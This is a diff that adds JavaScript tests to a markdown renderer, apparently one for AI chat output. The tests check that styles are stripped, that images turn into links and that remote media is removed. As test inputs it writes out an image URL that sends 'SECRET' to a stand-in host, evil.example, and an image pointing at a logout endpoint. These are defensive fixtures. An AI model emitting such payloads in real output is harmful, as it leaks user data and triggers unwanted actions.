@@ -48,3 +48,31 @@ test("a nested table keeps its wrapper", () => {
 	)
 	assert.ok(segments[0].html.includes('class="flow-md-table"'))
 })
+
+test("model HTML keeps no styles or classes of its own", () => {
+	const html = renderMarkdown('<span style="position:fixed;inset:0">x</span> <div class="fixed inset-0 z-40">y</div>')
+	assert.ok(!html.includes("style="))
+	assert.ok(!html.includes("fixed"))
+	// the renderer's own table wrapper keeps its class
+	assert.match(renderMarkdown(TABLE), /class="flow-md-table"/)
+})
+
+test("nothing in model text loads on render: images become links, media goes", () => {
+	const html = renderMarkdown(
+		'![chart](https://evil.example/p.png?d=SECRET) <img src="/api/method/logout" srcset="https://e.x/b.png 2x">',
+	)
+	assert.ok(!html.includes("<img"))
+	assert.match(html, /<a href="https:\/\/evil\.example\/p\.png\?d=SECRET"[^>]*>chart<\/a>/)
+	assert.match(html, /<a href="\/api\/method\/logout"[^>]*>\/api\/method\/logout<\/a>/)
+	// a linked badge keeps its link, with the image's label
+	assert.match(renderMarkdown("[![CI](https://e.x/badge.svg)](https://e.x/actions)"), /<a href="https:\/\/e\.x\/actions"[^>]*>CI<\/a>/)
+	for (const media of [
+		'<video autoplay src="https://e.x/v.mp4"></video>',
+		'<audio src="https://e.x/a.mp3" preload="auto"></audio>',
+		'<picture><source srcset="https://e.x/p.png"></picture>',
+		'<table background="https://e.x/bg.png"><tr><td>x</td></tr></table>',
+	])
+		assert.ok(!renderMarkdown(media).includes("e.x"), media)
+	// an inline data image fetches nothing
+	assert.match(renderMarkdown('<img src="data:image/png;base64,AAAA" alt="d">'), /<img src="data:image\/png;base64,AAAA"/)
+})
